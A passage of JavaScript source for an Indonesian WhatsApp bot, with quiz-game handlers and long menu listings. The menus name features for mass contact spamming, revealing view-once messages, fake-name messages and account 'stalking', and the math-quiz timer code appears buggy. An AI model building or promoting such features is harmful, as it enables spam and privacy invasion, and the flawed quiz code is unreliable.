            }
            break
            case 'tebakangka':
            case 'butawarna':
            case 'colorblind': {
                if (iGame(tebakangka, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                const soal = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/random/color_blind.json');
                const hasil = pickRandom(soal);
                let {
                    key
                } = await m.reply({
                    text: `Pilih Jawaban Yang Benar!\nPilihan: ${[hasil.number, ...hasil.similar].sort(() => Math.random() - 0.5).join(', ')}`,
                    contextInfo: {
                        externalAdReply: {
                            renderLargerThumbnail: true,
                            thumbnailUrl: hasil.color_blind[0],
                            body: `Level : ${hasil.lv}`,
                            previewType: 0,
                            mediaType: 1,
                        }
                    }
                });
                tebakangka[m.chat + key.id] = {
                    jawaban: hasil.number,
                    id: key.id
                }
                await sleep(60000)
                if (rdGame(tebakangka, m.chat, key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + tebakangka[m.chat + key.id].jawaban)
                    delete tebakangka[m.chat + key.id]
                }
            }
            break
            case 'kuismath':
            case 'math': {
                const {
                    genMath,
                    modes
                } = require('./lib/math');
                const inputMode = ['noob', 'easy', 'medium', 'hard', 'extreme', 'impossible', 'impossible2'];
                if (iGame(kuismath, m.chat)) return Replyx('Masih Ada Sesi Yang Belum Diselesaikan!')
                if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`, {
                    quoted: fkontak1
                })
                if (!inputMode.includes(text.toLowerCase())) return Replyx('Mode tidak ditemukan!')
                let result = await genMath(text.toLowerCase())
                let {
                    key
                } = await m.reply(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu : ${(result.waktu / 1000).toFixed(2)} detik`, {
                    quoted: fkontak1
                })
                kuismath[m.chat + key.id] = {
                    jawaban: result.jawaban,
                    mode: text.toLowerCase(),
                    id: key.id
                }
                await sleep(kuismath, result.waktu)
                if (rdGame(m.chat + key.id)) {
                    Replyx('Waktu Habis\nJawaban: ' + kuismath[m.chat + key.id].jawaban)
                    delete kuismath[m.chat + key.id]
                }
            }
            break

            // Menu

            case 'allmenu': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key
                    }
                })
                
        let imagePath = './lib/media/image/menu2.jpg' // 
								 
             let textMessage = `
*╭── ⧼ \`XLESYVIP\` ⧽*
*│ 々 Creator  : ${author}*
*│ 々 OwnerNumber : ${owner}*
*│ 々 BotName : ${botname}*
*│ 々 VersiOn  : ${require('./package.json').version}*
*│ 々 TypeSc  : Cjs*
*│ 々 Runtime  : ${runtime(process.uptime())}*
*╰────────────────⧽*
   \`⧼	  DEV : ${author}       ⧽\`
   
╭──────┈➤「 *\`BOT\`* 」❍
│ ${setv} ${prefix}_*claim*_
│ ${setv} ${prefix}_*buy [item] (nominal)*_
│ ${setv} ${prefix}_*transfer*_
│ ${setv} ${prefix}_*leaderboard*_
│ ${setv} ${prefix}_*request (text)*_
│ ${setv} ${prefix}_*react (emoji)*_
│ ${setv} ${prefix}_*tagme*_
│ ${setv} ${prefix}_*runtime*_
│ ${setv} ${prefix}_*totalfitur*_
│ ${setv} ${prefix}_*ping*_
│ ${setv} ${prefix}_*afk*_
│ ${setv} ${prefix}_*rvo (reply pesan viewone)*_
│ ${setv} ${prefix}_*inspect (url gc)*_
│ ${setv} ${prefix}_*addmsg*_
│ ${setv} ${prefix}_*delmsg*_
│ ${setv} ${prefix}_*getmsg*_
│ ${setv} ${prefix}_*listmsg*_
│ ${setv} ${prefix}_*q (reply pesan)*_
│ ${setv} ${prefix}_*menfes (62xxx|fake name)*_
│ ${setv} ${prefix}_*jadibot*_
│ ${setv} ${prefix}_*stopjadibot*_
│ ${setv} ${prefix}_*listjadibot*_
│ ${setv} ${prefix}_*jasajadibot*_
│ ${setv} ${prefix}_*sewa*_
│ ${setv} ${prefix}_*donasi*_
│ ${setv} ${prefix}_*pay*_
╰─┬────┈➤
╭─┴─┈➤「 *\`GROUP\`* 」❍  
│ ${setv} ${prefix}_*add (62xxx)*_  
│ ${setv} ${prefix}_*kick (@tag/62xxx)*_  
│ ${setv} ${prefix}_*promote (@tag/62xxx)*_  
│ ${setv} ${prefix}_*demote (@tag/62xxx)*_  
│ ${setv} ${prefix}_*setname (nama baru gc)*_  
│ ${setv} ${prefix}_*setdesc (desk)*_  
│ ${setv} ${prefix}_*setppgc (reply imgnya)*_  
│ ${setv} ${prefix}_*delete (reply pesan)*_  
│ ${setv} ${prefix}_*linkgrup*_  
│ ${setv} ${prefix}_*revoke*_  
│ ${setv} ${prefix}_*tagall*_  
│ ${setv} ${prefix}_*hidetag*_  
│ ${setv} ${prefix}_*totag (reply pesan)*_  
│ ${setv} ${prefix}_*listonline*_  
│ ${setv} ${prefix}_*group set*_  
╰─┬────┈➤
╭─┴─┈➤「 *\`SEARCH\`* 」❍  
│ ${setv} ${prefix}_*ytsearch (query)*_  
│ ${setv} ${prefix}_*pixiv (query)*_  
│ ${setv} ${prefix}_*pinterest (query)*_  
│ ${setv} ${prefix}_*wallpaper (query)*_  
│ ${setv} ${prefix}_*ringtone (query)*_  
│ ${setv} ${prefix}_*google (query)*_  
│ ${setv} ${prefix}_*gimage (query)*_  
│ ${setv} ${prefix}_*npm (query)*_  
│ ${setv} ${prefix}_*style (query)*_  
│ ${setv} ${prefix}_*ig (url akun ig)*_  
│ ${setv} ${prefix}_*searchgroup (nama_gc)*_  
│ ${setv} ${prefix}_*waktudunia*_  
│ ${setv} ${prefix}_*cuaca (kota)*_  
│ ${setv} ${prefix}_*animecari*_  
│ ${setv} ${prefix}_*mlnews*_  
╰─┬────┈➤
╭─┴─┈➤「 *\`DOWNLOAD\`* 」❍  
│ ${setv} ${prefix}_*ytmp3 (url)*_  
│ ${setv} ${prefix}_*ytmp4 (url)*_  
│ ${setv} ${prefix}_*instagram (url)*_  
│ ${setv} ${prefix}_*ttmp3 (url)*_  
│ ${setv} ${prefix}_*ttmp4 (url)*_  
│ ${setv} ${prefix}_*igstory (url)*_  
│ ${setv} ${prefix}_*facebook (url)*_  
│ ${setv} ${prefix}_*spotifydl (url)*_  
│ ${setv} ${prefix}_*mediafire (url)*_  
╰─┬────┈➤
╭─┴┈➤「 *\`PUSH\`* 」❍  
│ ${setv} ${prefix}_*pushkontak*_  
│ ${setv} ${prefix}_*pushkontak*_  
│ ${setv} ${prefix}_*pushkontakid*_  
│ ${setv} ${prefix}_*jpm*_  
│ ${setv} ${prefix}_*setteksjpm*_  
│ ${setv} ${prefix}_*teksjpm*_  
│ ${setv} ${prefix}_*svkontak (nama kontak)*_  
╰─┬──┈➤  
╭─┴─┈➤「 *\`QUOTES\`* 」❍  
│ ${setv} ${prefix}_*motivasi*_  
│ ${setv} ${prefix}_*quotes*_  
│ ${setv} ${prefix}_*quotesislamic*_  
│ ${setv} ${prefix}_*quotessad*_  
│ ${setv} ${prefix}_*truth*_  
│ ${setv} ${prefix}_*renungan*_  
╰─┬────┈➤
╭─┴┈➤「 *LIBRAY MENU* 」❍    
│ ${setv} ${prefix}_*cerpen-anak*_  
│ ${setv} ${prefix}_*cerpen-bahasadaerah*_  
│ ${setv} ${prefix}_*cerpen-bahasainggris*_  
│ ${setv} ${prefix}_*cerpen-bahasajawa*_  
│ ${setv} ${prefix}_*cerpen-bahasasunda*_  
│ ${setv} ${prefix}_*cerpen-budaya*_  
│ ${setv} ${prefix}_*cerpen-cinta*_  
│ ${setv} ${prefix}_*cerpen-cintaislami*_  
│ ${setv} ${prefix}_*cerpen-cintapertama*_  
│ ${setv} ${prefix}_*cerpen-cintaromantis*_  
│ ${setv} ${prefix}_*cerpen-cintasedih*_  
│ ${setv} ${prefix}_*cerpen-cintasegitiga*_  
│ ${setv} ${prefix}_*cerpen-cintasejati*_  
│ ${setv} ${prefix}_*cerpen-galau*_  
│ ${setv} ${prefix}_*cerpen-gokil*_  
│ ${setv} ${prefix}_*cerpen-inspiratif*_  
│ ${setv} ${prefix}_*cerpen-jepang*_  
│ ${setv} ${prefix}_*cerpen-kehidupan*_  
│ ${setv} ${prefix}_*cerpen-keluarga*_  
│ ${setv} ${prefix}_*cerpen-kisahnyata*_  
│ ${setv} ${prefix}_*cerpen-korea*_  
│ ${setv} ${prefix}_*cerpen-kristen*_  
│ ${setv} ${prefix}_*cerpen-liburan*_  
│ ${setv} ${prefix}_*cerpen-malaysia*_  
│ ${setv} ${prefix}_*cerpen-mengharukan*_  
│ ${setv} ${prefix}_*cerpen-misteri*_  
│ ${setv} ${prefix}_*cerpen-motivasi*_  
│ ${setv} ${prefix}_*cerpen-nasihat*_  
│ ${setv} ${prefix}_*cerpen-nasionalisme*_  
│ ${setv} ${prefix}_*cerpen-olahraga*_  
│ ${setv} ${prefix}_*cerpen-patahhati*_  
│ ${setv} ${prefix}_*cerpen-penantian*_  
│ ${setv} ${prefix}_*cerpen-pendidikan*_  
│ ${setv} ${prefix}_*cerpen-pengalaman*_  
│ ${setv} ${prefix}_*cerpen-pengorbanan*_  
│ ${setv} ${prefix}_*cerpen-penyesalan*_  
│ ${setv} ${prefix}_*cerpen-perjuangan*_  
│ ${setv} ${prefix}_*cerpen-perpisahan*_  
│ ${setv} ${prefix}_*cerpen-persahabatan*_  
│ ${setv} ${prefix}_*cerpen-petualangan*_  
│ ${setv} ${prefix}_*cerpen-ramadhan*_  
│ ${setv} ${prefix}_*cerpen-remaja*_  
│ ${setv} ${prefix}_*cerpen-rindu*_  
│ ${setv} ${prefix}_*cerpen-rohani*_  
│ ${setv} ${prefix}_*cerpen-romantis*_  
│ ${setv} ${prefix}_*cerpen-sastra*_  
│ ${setv} ${prefix}_*cerpen-sedih*_  
│ ${setv} ${prefix}_*cerpen-sejarah*_  
╰─┬───┈➤
╭─┴─┈➤「 *\`TOOLS\`* 」❍  
│ ${setv} ${prefix}_*get (url)*_  
│ ${setv} ${prefix}_*hd (reply pesan)*_  
│ ${setv} ${prefix}_*toaudio (reply pesan)*_  
│ ${setv} ${prefix}_*tomp3 (reply pesan)*_  
│ ${setv} ${prefix}_*tovn (reply pesan)*_  
│ ${setv} ${prefix}_*toimage (reply pesan)*_  
│ ${setv} ${prefix}_*toptv (reply pesan)*_  
│ ${setv} ${prefix}_*tourl (reply pesan)*_  
│ ${setv} ${prefix}_*tts (textnya)*_  
│ ${setv} ${prefix}_*toqr (textnya)*_  
│ ${setv} ${prefix}_*ssweb (url)*_  
│ ${setv} ${prefix}_*enc*_  
│ ${setv} ${prefix}_*githubtrend*_  
│ ${setv} ${prefix}_*breatanime (teks)*_  
│ ${setv} ${prefix}_*brat (teks)*_  
│ ${setv} ${prefix}_*bratvid (teks)*_  
│ ${setv} ${prefix}_*sticker (send/reply img)*_  
│ ${setv} ${prefix}_*colong (reply stiker)*_  
│ ${setv} ${prefix}_*smeme (send/reply img)*_  
│ ${setv} ${prefix}_*emojimix 🙃+💀*_  
│ ${setv} ${prefix}_*nulis*_  
│ ${setv} ${prefix}_*readmore text1|text2*_  
│ ${setv} ${prefix}_*qc (pesannya)*_  
│ ${setv} ${prefix}_*translate*_  
│ ${setv} ${prefix}_*wasted (send/reply img)*_  
│ ${setv} ${prefix}_*triggered (send/reply img)*_  
│ ${setv} ${prefix}_*shorturl (urlnya)*_  
│ ${setv} ${prefix}_*gitclone (urlnya)*_  
│ ${setv} ${prefix}_*fat (reply audio)*_  
│ ${setv} ${prefix}_*fast (reply audio)*_  
│ ${setv} ${prefix}_*bass (reply audio)*_  
│ ${setv} ${prefix}_*slow (reply audio)*_  
│ ${setv} ${prefix}_*tupai (reply audio)*_  
│ ${setv} ${prefix}_*deep (reply audio)*_  
│ ${setv} ${prefix}_*robot (reply audio)*_  
│ ${setv} ${prefix}_*blown (reply audio)*_  
│ ${setv} ${prefix}_*reverse (reply audio)*_  
│ ${setv} ${prefix}_*smooth (reply audio)*_  
│ ${setv} ${prefix}_*earrape (reply audio)*_  
│ ${setv} ${prefix}_*nightcore (reply audio)*_  
│ ${setv} ${prefix}_*getexif (reply sticker)*_  
╰─┬────┈➤
╭─┴─┈➤「 *\`Stalk\`* 」❍  
│ ${setv} ${prefix}_*ffstalk*_
│ ${setv} ${prefix}_*mlstalk*_
│ ${setv} ${prefix}_*igstalk*_
│ ${setv} ${prefix}_*ytstalk*_
│ ${setv} ${prefix}_*genshinstalk*_
│ ${setv} ${prefix}_*twiterstalk*&
│ ${setv} ${prefix}_*telestalk*_
│ ${setv} ${prefix}_*bankstalk*_
│ ${setv} ${prefix}_*ghstalk*&
│ ${setv} ${prefix}_*chwastalk*_
│ ${setv} ${prefix}_*ytstalk*_
│ ${setv} ${prefix}_*bandlabstalk*_
│ ${setv} ${prefix}_*minicraftstalk*_
│ ${setv} ${prefix}_*steamstalk*_
│ ${setv} ${prefix}_*xboxstalk*_
╰─┬────┈➤  
╭─┴─┈➤「 *\`AI\`* 」❍  
│ ${setv} ${prefix}_*autoaixlesy*_
│ ${setv} ${prefix}_*ai (query)*_  
│ ${setv} ${prefix}_*Xlesy (query)*_
│ ${setv} ${prefix}_*simi (query)*_  
│ ${setv} ${prefix}_*txt2img (query)*_  
│ ${setv} ${prefix}_*aigen*_
╰─┬────┈➤  
╭─┴─┈➤「 *\`ANIME\`* 」❍  
│ ${setv} ${prefix}_*waifu*_  
│ ${setv} ${prefix}_*neko*_  
│ ${setv} ${prefix}_*animeawoo*_  
│ ${setv} ${prefix}_*animemegumin*_  
│ ${setv} ${prefix}_*animeshinobu*_  
│ ${setv} ${prefix}_*animehandhold*_  
│ ${setv} ${prefix}_*animehighfive*_  
│ ${setv} ${prefix}_*animecringe*_  
│ ${setv} ${prefix}_*animedance*_  
│ ${setv} ${prefix}_*animehappy*_  
│ ${setv} ${prefix}_*animeglomp*_  
│ ${setv} ${prefix}_*animesmug*_  
│ ${setv} ${prefix}_*animeblush*_  
│ ${setv} ${prefix}_*animewave*_  
│ ${setv} ${prefix}_*animesmile*_  
│ ${setv} ${prefix}_*animepoke*_  
│ ${setv} ${prefix}_*animewink*_  
│ ${setv} ${prefix}_*animebonk*_  
│ ${setv} ${prefix}_*animebully*_  
│ ${setv} ${prefix}_*animeyeet*_  
│ ${setv} ${prefix}_*animebite*_  
│ ${setv} ${prefix}_*animelick*_  
│ ${setv} ${prefix}_*animekill*_  
│ ${setv} ${prefix}_*animecry*_  
│ ${setv} ${prefix}_*animewlp*_  
│ ${setv} ${prefix}_*animekiss*_  
│ ${setv} ${prefix}_*animehug*_  
│ ${setv} ${prefix}_*couplepp*_  
│ ${setv} ${prefix}_*animeneko*_  
│ ${setv} ${prefix}_*animepat*_  
│ ${setv} ${prefix}_*animeslap*_  
│ ${setv} ${prefix}_*animecuddle*_  
│ ${setv} ${prefix}_*animewaifu*_  
│ ${setv} ${prefix}_*animenom*_  
│ ${setv} ${prefix}_*animefoxgirl*_  
│ ${setv} ${prefix}_*animetickle*_  
│ ${setv} ${prefix}_*animegecg*_  
│ ${setv} ${prefix}_*dogwoof*_  
│ ${setv} ${prefix}_*8ballpool*_  
│ ${setv} ${prefix}_*goosebird*_  
│ ${setv} ${prefix}_*animefeed*_  
│ ${setv} ${prefix}_*animeavatar*_  
│ ${setv} ${prefix}_*lizardpic*_  
│ ${setv} ${prefix}_*catmeow*_
╰─┬───┈➤ 
╭─┴─┈➤「 *\`MUSIC\`* 」❍  
│ ${setv} ${prefix}_*music1*_
│ ${setv} ${prefix}_*music2*_
│ ${setv} ${prefix}_*music3*_
│ ${setv} ${prefix}_*music4*_
│ ${setv} ${prefix}_*music5*_
│ ${setv} ${prefix}_*music6*_
│ ${setv} ${prefix}_*music7*_
│ ${setv} ${prefix}_*music8*_
│ ${setv} ${prefix}_*music9*_
│ ${setv} ${prefix}_*music10*_
│ ${setv} ${prefix}_*playmusic (list menumusicnya)*_
╰─┬───┈➤  
╭─┴─┈➤「 *\`GAME\`* 」❍  
│ ${setv} ${prefix}_*tictactoe*_
│ ${setv} ${prefix}_*akinator*_
│ ${setv} ${prefix}_*suit*_
│ ${setv} ${prefix}_*slot*_
│ ${setv} ${prefix}_*math (level)*_
│ ${setv} ${prefix}_*begal*_
│ ${setv} ${prefix}_*casino (nominal)*_
│ ${setv} ${prefix}_*rampok (@tag)*_
│ ${setv} ${prefix}_*tekateki*_
│ ${setv} ${prefix}_*tebaklirik*_
│ ${setv} ${prefix}_*tebakkata*_
│ ${setv} ${prefix}_*tebakbom*_
│ ${setv} ${prefix}_*susunkata*_
│ ${setv} ${prefix}_*tebakkimia*_
│ ${setv} ${prefix}_*caklontong*_
│ ${setv} ${prefix}_*tebaknegara*_
│ ${setv} ${prefix}_*tebakgambar*_
│ ${setv} ${prefix}_*tebakbendera*_
╰─┬────┈➤
╭─┴─┈➤「 *\`FUN\`* 」❍  
│ ${setv} ${prefix}_*dadu*_
│ ${setv} ${prefix}_*bisakah (text)*_
│ ${setv} ${prefix}_*apakah (text)*_
│ ${setv} ${prefix}_*kapan (text)*_
│ ${setv} ${prefix}_*kerangajaib (text)*_
│ ${setv} ${prefix}_*cekmati (nama lu)*_
│ ${setv} ${prefix}_*ceksifat*_
│ ${setv} ${prefix}_*cekkhodam (nama lu)*_
│ ${setv} ${prefix}_*rate (reply pesan)*_
│ ${setv} ${prefix}_*jodohku*_
│ ${setv} ${prefix}_*jadian*_
│ ${setv} ${prefix}_*fitnah*_
│ ${setv} ${prefix}_*halah (text)*_
│ ${setv} ${prefix}_*hilih (text)*_
│ ${setv} ${prefix}_*huluh (text)*_
│ ${setv} ${prefix}_*heleh (text)*_
│ ${setv} ${prefix}_*holoh (text)*_
╰─┬────┈➤  
╭─┴─┈➤「 *\`RANDOM\`* 」❍  
│ ${setv} ${prefix}_*coffe*_ 
│ ${setv} ${prefix}_*bluearchive*_
│ ${setv} ${prefix}_*cecanindo*_  
│ ${setv} ${prefix}_*cecancina*_
│ ${setv} ${prefix}_*cecanjapan*_
│ ${setv} ${prefix}_*cecankorea*_
│ ${setv} ${prefix}_*cecantahiland*_
│ ${setv} ${prefix}_*kucing*_
╰─┬────┈➤  
╭─┴─┈➤「 *\`OWNER\`* 」❍  
│ ${setv} ${prefix}_*bot [set]*_
│ ${setv} ${prefix}_*done*_
│ ${setv} ${prefix}_*setbio*_
│ ${setv} ${prefix}_*setppbot*_
│ ${setv} ${prefix}_*join*_
│ ${setv} ${prefix}_*leave*_
│ ${setv} ${prefix}_*leaveid*_
│ ${setv} ${prefix}_*block*_
│ ${setv} ${prefix}_*listblock*_
│ ${setv} ${prefix}_*openblock*_
│ ${setv} ${prefix}_*listpc*_
│ ${setv} ${prefix}_*listgcbot*_
│ ${setv} ${prefix}_*listgc*_
│ ${setv} ${prefix}_*replay (pesannya)*_
│ ${setv} ${prefix}_*replay1 (pesannya)*_
│ ${setv} ${prefix}_*notif*_
│ ${setv} ${prefix}_*creategc*_
│ ${setv} ${prefix}_*addprem*_
│ ${setv} ${prefix}_*delprem*_
│ ${setv} ${prefix}_*listprem*_
│ ${setv} ${prefix}_*addlimit*_
│ ${setv} ${prefix}_*adduang*_
│ ${setv} ${prefix}_*bot --settings*_
│ ${setv} ${prefix}_*bot settings*_
│ ${setv} ${prefix}_*restartbot*_
│ ${setv} ${prefix}_*getsession*_
│ ${setv} ${prefix}_*delsession*_
│ ${setv} ${prefix}_*delsampah*_
│ ${setv} ${prefix}_*upsw*_
╰─────┈➤

`
		let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break			
            //MENU-MENU
            case 'botmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭─┴─┈➤「 *BOT MENU* 」❍
│ ${setv} ${prefix}claim
│ ${setv} ${prefix}buy [item] (nominal)
│ ${setv} ${prefix}transfer
│ ${setv} ${prefix}leaderboard
│ ${setv} ${prefix}request (text)
│ ${setv} ${prefix}react (emoji)
│ ${setv} ${prefix}tagme
│ ${setv} ${prefix}runtime
│ ${setv} ${prefix}totalfitur
│ ${setv} ${prefix}ping
│ ${setv} ${prefix}afk
│ ${setv} ${prefix}rvo (reply pesan viewone)
│ ${setv} ${prefix}inspect (url gc)
│ ${setv} ${prefix}addmsg
│ ${setv} ${prefix}delmsg
│ ${setv} ${prefix}getmsg
│ ${setv} ${prefix}listmsg
│ ${setv} ${prefix}q (reply pesan)
│ ${setv} ${prefix}menfes (62xxx|fake name)
│ ${setv} ${prefix}jadibot
│ ${setv} ${prefix}stopjadibot
│ ${setv} ${prefix}listjadibot
│ ${setv} ${prefix}jasajadibot
│ ${setv} ${prefix}sewa
│ ${setv} ${prefix}donasi
│ ${setv} ${prefix}pay
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break

            case 'groupmenu': {
            if (!m.isGroup) return Replyx('Fitur ini hanya dapat digunakan di grup.', {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭────┈➤「 *GROUP MENU* 」❍
│ ${setv} ${prefix}add (62xxx)
│ ${setv} ${prefix}kick (@tag/62xxx)
│ ${setv} ${prefix}promote (@tag/62xxx)
│ ${setv} ${prefix}demote (@tag/62xxx)
│ ${setv} ${prefix}setname (nama baru gc)
│ ${setv} ${prefix}setdesc (desk)
│ ${setv} ${prefix}setppgc (reply imgnya)
│ ${setv} ${prefix}delete (reply pesan)
│ ${setv} ${prefix}linkgrup
│ ${setv} ${prefix}revoke
│ ${setv} ${prefix}tagall
│ ${setv} ${prefix}hidetag
│ ${setv} ${prefix}totag (reply pesan)
│ ${setv} ${prefix}listonline
│ ${setv} ${prefix}group set
╰──────┈➤
`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'searchmenu': {
                    Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭─────┈➤「 *SEARCH MENU * 」❍
│ ${setv} ${prefix}ytsearch (query)
│ ${setv} ${prefix}pixiv (query)
│ ${setv} ${prefix}pinterest (query)
│ ${setv} ${prefix}wallpaper (query)
│ ${setv} ${prefix}ringtone (query)
│ ${setv} ${prefix}google (query)
│ ${setv} ${prefix}gimage (query)
│ ${setv} ${prefix}npm (query)
│ ${setv} ${prefix}style (query)
│ ${setv} ${prefix}searchgroup (nama_group)
│ ${setv} ${prefix}ig (url akun ig)
│ ${setv} ${prefix}waktudunia
│ ${setv} ${prefix}cuaca (kota)
│ ${setv} ${prefix}animecari (judul)
│ ${setv} ${prefix}mlnews
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'downloadmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*

╭───┈➤「 *DOWNLOAD MENU* 」❍
│ ${setv} ${prefix}ytmp3 (url)
│ ${setv} ${prefix}ytmp4 (url)
│ ${setv} ${prefix}instagram (url)
│ ${setv} ${prefix}tiktok (url)
│ ${setv} ${prefix}ttmp4 (url)
│ ${setv} ${prefix}igdown (url)
│ ${setv} ${prefix}igstory (url)
│ ${setv} ${prefix}facebook (url)
│ ${setv} ${prefix}spotifydl (url)
│ ${setv} ${prefix}mediafire (url)
╰──────┈➤
`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'quotesmenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭──┈➤「 *QUOTES MENU* 」❍
│ ${setv} ${prefix}motivasi
│ ${setv} ${prefix}quotes
│ ${setv} ${prefix}quotesIslamic 
│ ${setv} ${prefix}quotessad
│ ${setv} ${prefix}truth
│ ${setv} ${prefix}renungan
╰─────┈➤`
                let buttons = [{
    buttonId: ".menu",
    buttonText: {
        displayText: "Back To Menu"
    },
    type: 1
}]

// Kirim gambar lokal + teks + tombol + contextInfo
await Xlesy.sendButtonMsg(m.chat, {
    image: {
        url: imagePath
    },
    text: textMessage,
    footer: 'XLESYVIP',
    buttons: buttons,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363405649403674@newsletter",
            newsletterName: `スクリプト更新情報`
        },
        externalAdReply: {
            title: m.pushName,
            body: packname,
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: false,
            mediaUrl: my.gh,
            sourceUrl: my.gh,
        }
    }
}, {
    quoted: ftroli
})
}
break
            case 'librarymenu': {
                Replyx(mess.wait)
                let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

                let textMessage = `          *⧼ LIST MENU XLESY ⧽*
 
╭──┈➤「 *LIBRAY MENU* 」❍  
│ ${setv} ${prefix}cerpen-anak  
│ ${setv} ${prefix}cerpen-bahasadaerah  
│ ${setv} ${prefix}cerpen-bahasainggris  
│ ${setv} ${prefix}cerpen-bahasajawa  
│ ${setv} ${prefix}cerpen-bahasasunda  
│ ${setv} ${prefix}cerpen-budaya  
│ ${setv} ${prefix}cerpen-cinta  
│ ${setv} ${prefix}cerpen-cintaislami  
│ ${setv} ${prefix}cerpen-cintapertama  
│ ${setv} ${prefix}cerpen-cintaromantis  
│ ${setv} ${prefix}cerpen-cintasedih  
│ ${setv} ${prefix}cerpen-cintasegitiga  
│ ${setv} ${prefix}cerpen-cintasejati  
│ ${setv} ${prefix}cerpen-galau  
│ ${setv} ${prefix}cerpen-gokil  
│ ${setv} ${prefix}cerpen-inspiratif  
│ ${setv} ${prefix}cerpen-jepang  
│ ${setv} ${prefix}cerpen-kehidupan  
│ ${setv} ${prefix}cerpen-keluarga  
│ ${setv} ${prefix}cerpen-kisahnyata  
│ ${setv} ${prefix}cerpen-korea  
│ ${setv} ${prefix}cerpen-kristen  
│ ${setv} ${prefix}cerpen-liburan  
│ ${setv} ${prefix}cerpen-malaysia  
